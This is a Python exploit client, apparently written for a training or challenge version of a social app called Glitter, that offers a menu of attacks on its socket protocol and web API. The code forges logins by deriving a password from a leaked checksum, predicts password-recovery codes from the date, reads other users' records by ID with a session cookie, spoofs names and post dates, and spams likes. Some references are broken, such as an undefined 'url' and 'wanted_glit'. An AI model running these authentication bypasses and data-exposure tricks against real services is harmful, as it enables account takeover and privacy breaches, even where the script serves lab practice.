import socket
import re
import requests
import datetime

LOGIN = """100#{gli&&er}{"user_name":"USER","password":"PASS","enable_push_notifications":true}##"""
CHECK_SUM = """110#{gli&&er}ASCI_CODE##"""

FORMAT = 'CODE#{gli&&er}{DATA}##'
URL = "url"

IP = "ip"
GET_RECV = 1024
PORT = 1336

clientSocket = None
sparkle_cookie = None
glit_id = None


def challenge_password():
    logout()
    current_date = datetime.datetime.now()
    day = current_date.day
    month = current_date.month
    time_str = current_date.strftime("%H%M")
    password_recover_path = "password-recovery-code-request/"
    recover = URL + password_recover_path
    user_name = input("Enter user you want to recover password for: ")
    req = requests.post(recover, json={"user_name": user_name})
    word = req.text  # Assuming the response contains the word.
    recovered_str = f"{day}{month}{word}{time_str}"
    req = requests.post(recover, json={"user_name": user_name, "recovered_str": recovered_str})
    print(req.text)


def logout():
    log_out = "200#{gli&&er}number##"
    log_out = log_out.replace("number", str(glit_id))
    clientSocket.sendall(log_out.encode())
    get_message = clientSocket.recv(GET_RECV).decode()
    print(get_message)


def get_password(target_ascii_sum):
    password = []
    current_sum = 0

    while current_sum + ord('z') <= target_ascii_sum - ord('0'):
        password.append('z')
        current_sum += ord('z')

        if current_sum + ord('0') <= target_ascii_sum:
            password.append('0')
            current_sum += ord('0')
        else:
            break

    if current_sum < target_ascii_sum:
        password.append(chr(target_ascii_sum - current_sum))

    return ''.join(password)


def login_challenge():
    global CHECK_SUM
    logout()
    user_name = input("Enter user you want to login: ")
    login_example = LOGIN.replace("USER", user_name).replace("PASS", "example")
    clientSocket.sendall(login_example.encode())
    get_message = clientSocket.recv(GET_RECV).decode()
    match = re.search(r'checksum: (\d+)', get_message)
    if match:
        ascii_checksum = int(match.group(1))
        ascii_of_user = sum(ord(char) for char in user_name)
        password_checksum = ascii_checksum - ascii_of_user
        print(password_checksum)
        password = get_password(password_checksum)
        login_example = LOGIN.replace("USER", user_name).replace("PASS", password)
        clientSocket.sendall(login_example.encode())
        get_message = clientSocket.recv(GET_RECV).decode()
        print(get_message)
        example_check_sum = CHECK_SUM.replace("ASCI_CODE", str(ascii_checksum))
        clientSocket.sendall(example_check_sum.encode())
        get_message = clientSocket.recv(GET_RECV).decode()
        print(get_message)
    else:
        print("User does not exist")


def users():
    url_et = URL + "entity/number"
    user_id = input("Enter number of id (e.g., 18175): ")
    full_url = url_et.replace("number", user_id)
    try:
        response = requests.get(full_url, cookies={'sparkle': sparkle_cookie})
        print(response.text)
    except Exception as e:
        print(f"An error occurred: {e}")


def login_and_fetch_data(user, password):
    global sparkle_cookie
    global glit_id
    global id_user

    login_url = URL + "login"
    user_url = URL + "user"
    entity_url = "entity/number"

    print("Login..")
    response = requests.get(login_url)

    response = requests.post(user_url, json=[user,password])
    print(response.text)
    match = re.search(r'id":(\d+)', response.text)
    if match:
        id_user = match.group(1)
    else:
        print("User ID not found in the response. Something went wrong.")
        return False

    cookies = re.search(r'"sparkle":"(.*?)"', response.text)
    if cookies:
        sparkle_cookie = cookies.group(1)
    else:
        print("Sparkle cookie not found in the response.")
        return False


    # Replace 'number' in URLs with the user ID
    entity_url = entity_url.replace("number", str(id_user))

    # Make the GET request with the extracted cookie
    response = requests.get(url + entity_url, cookies={'sparkle': sparkle_cookie})
    if re.search(r'id',response.text) :
        print("Login success for the html")
        return True
    else:
        print("someting went wrong")
        return False


def search_bug(data):
    search_request = change_format("300", '"search_type":"SIMPLE","search_entry":"search_data"')
    data = search_request.replace("search_data", data)
    clientSocket.sendall(data.encode())
    print(clientSocket.recv(GET_RECV).decode())


def change_display_name(name):
    wanted_content = input("Enter content: ")

    display_name_request = change_format("650", f'"glit_id":{wanted_glit},"user_id":{id_user},"user_screen_name":"{name}","id":-1,"content":"tomorrow","date":"2024-06-22T13:31:56.769Z"')
    clientSocket.sendall(display_name_request.encode())
    print(clientSocket.recv(GET_RECV).decode())


def post_with_changed_year(year):
    wanted_content = input("Enter content: ")
    post_request = change_format("550", (f'"feed_owner_id":{glit_id},"publisher_id":{glit_id},"publisher_screen_name":"user","publisher_avatar":"im1","background_color":"White","date":"{year}-06-22T13:47:11.485Z","content":"{wanted_content}","font_color":"black","id":-1'))
    clientSocket.sendall(post_request.encode())
    print(clientSocket.recv(GET_RECV).decode())


def get_glits():
    message = change_format("500", (f'"feed_owner_id":{glit_id},"end_date":"2024-07-02T19:01:40.862Z","glit_count":2'))
    clientSocket.sendall(message.encode())
    response = clientSocket.recv(GET_RECV).decode()

    pattern = re.compile(r'"glit_id":(\d+).*?"content":"(.*?)"')
    matches = pattern.findall(response)

    for i, (glit_id, content) in enumerate(matches, 1):
        print(f"{i}. Content: {content}")

    chosen_index = int(input("Enter choice: "))
    chosen_glit_id, chosen_content = matches[chosen_index - 1]
    return chosen_glit_id


def history_disc():
    message = input("Enter number: ")
    find = "320#{gli&&er}##number"
    find = find.replace("number", message)
    clientSocket.sendall(find.encode())
    print(clientSocket.recv(GET_RECV).decode())


def like_spam():
    glit_wanted = get_glits()
    clientSocket.recv(GET_RECV).decode()
    like_request = change_format("710", (f'"glit_id":{glit_wanted},"user_id":{glit_id},"user_screen_name":"user","id":-1'))
    for _ in range(3):
        clientSocket.sendall(like_request.encode())
        print(clientSocket.recv(GET_RECV).decode())


def login_info_disclosure():
    login_request = change_format("500", f'"feed_owner_id":{glit_id},"end_date":"2024-06-23T13:51:35.369Z","glit_count":2')
    clientSocket.sendall(login_request.encode())
    print(clientSocket.recv(GET_RECV).decode())


def change_format(code, data):
    return FORMAT.replace("CODE", code).replace("DATA", data)


def menu_app():
    print("1. Search Information Disclosure")
    print("2. Change Display Name for Reply")
    print("3. Change Year in New Glit")
    print("4. Make Me Famous with Likes")
    print("5. Login Information Disclosure")
    print("6. Search by Number")


def challenges():
    print("11. Login Challenge")
    print("12. Challenge 2 (Not Implemented)")
    print("13. Challenge 3 (Not Implemented)")
    print("14. Challenge 4 (Not Implemented)")


def menu_html():
    print("7. ID to Details")
    print("8. Option 8 (Not Implemented)")
    print("9. Option 9 (Not Implemented)")
    print("10. Option 10 (Not Implemented)")


def login_info():
    name = input("Enter your username: ")
    password = input("Enter your password: ")
    return name, password


def main():
    global clientSocket
    global name, password
    global glit_id

    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        clientSocket.connect((IP, PORT))
        name, password = login_info()
        login_example = LOGIN.replace("USER", name).replace("PASS", password)
        clientSocket.sendall(login_example.encode())
        get_message = clientSocket.recv(GET_RECV).decode()
        login_error = re.search(r'109#', get_message)
        user_login = re.search(r'108#', get_message)
        illegal_user = re.search(r'952#', get_message)

        while login_error or illegal_user or user_login:
            login_error = illegal_user = user_login = False
            name, password = login_info()
            login_example = LOGIN.replace("USER", name).replace("PASS", password)
            clientSocket.sendall(login_example.encode())
            get_message = clientSocket.recv(GET_RECV).decode()
            login_error = re.search(r'109#', get_message)
            user_login = re.search(r'108#', get_message)
            illegal_user = re.search(r'952#', get_message)

        example_check_sum = CHECK_SUM.replace("ASCI_CODE", str(sum(ord(char) for char in name) + sum(ord(char) for char in password)))
        clientSocket.sendall(example_check_sum.encode())
        get_message = clientSocket.recv(GET_RECV).decode()

        if re.search(r'115', get_message):
            print("Login success for the app")
            work_app = True
        else:
            print("Login failed for the app")
            work_app = False
            exit()

        match = re.search(r'id":(\d+)', get_message)
        if match:
            glit_id = match.group(1)
        print("Your ID:", glit_id)

        work_html = login_and_fetch_data(name, password)

        if work_app and work_html:
            menu_app()
            menu_html()
            challenges()
            choice = int(input("Enter your choice: "))
            if choice == 1:
                data = input("Enter search data: ")
                search_bug(data)
            elif choice == 2:
                display_name = input("Enter display name: ")
                change_display_name(display_name)
            elif choice == 3:
                year = int(input("Enter year: "))
                post_with_changed_year(year)
            elif choice == 4:
                like_spam()
            elif choice == 5:
                login_info_disclosure()
            elif choice == 6:
                history_disc()
            elif choice == 7:
                users()
            elif choice == 11:
                login_challenge()
            else:
                print("Invalid choice.")

        clientSocket.close()
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
